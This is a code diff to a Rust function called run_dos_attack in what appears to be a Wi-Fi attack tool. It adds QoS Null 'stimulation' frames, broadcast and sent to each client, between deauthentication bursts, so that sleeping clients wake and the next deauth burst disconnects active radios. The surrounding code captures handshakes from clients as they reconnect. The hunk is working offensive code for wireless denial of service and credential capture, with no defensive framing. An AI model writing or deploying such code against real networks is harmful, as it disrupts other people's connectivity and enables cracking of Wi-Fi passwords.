@@ -800,12 +800,39 @@ fn run_dos_attack(
 
             // Pause — check running flag every 100ms so Ctrl+C is responsive
             // Drain RX frames during pause — capture handshakes from reconnecting clients
+            // Midway through pause, send QoS Null stimulation to wake sleeping clients
+            // so the next deauth burst hits active radios.
             let pause_start = Instant::now();
+            let mut stimulated_this_pause = false;
             while running.load(Ordering::SeqCst) && pause_start.elapsed() < params.burst_pause {
                 for _frame in reader.drain() {
                     let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                     info.frames_received += 1;
                 }
+
+                // Stimulate midway through the pause (after 1s)
+                if !stimulated_this_pause && pause_start.elapsed() >= Duration::from_secs(1) {
+                    let clients: Vec<MacAddress> = {
+                        let lc = live_clients.lock().unwrap_or_else(|e| e.into_inner());
+                        lc.clone()
+                    };
+                    // Broadcast QoS Null
+                    let stim = frames::build_qos_null_stimulation(&MacAddress::BROADCAST, &target.bssid);
+                    if shared.tx_frame(&stim, &tx_opts).is_ok() {
+                        frames_sent += 1;
+                        bytes_sent += stim.len() as u64;
+                    }
+                    // Unicast to each known client
+                    for client_mac in &clients {
+                        let stim = frames::build_qos_null_stimulation(client_mac, &target.bssid);
+                        if shared.tx_frame(&stim, &tx_opts).is_ok() {
+                            frames_sent += 1;
+                            bytes_sent += stim.len() as u64;
+                        }
+                    }
+                    stimulated_this_pause = true;
+                }
+
                 thread::sleep(Duration::from_millis(100));
             }
             pause_time_in_window += pause_start.elapsed();
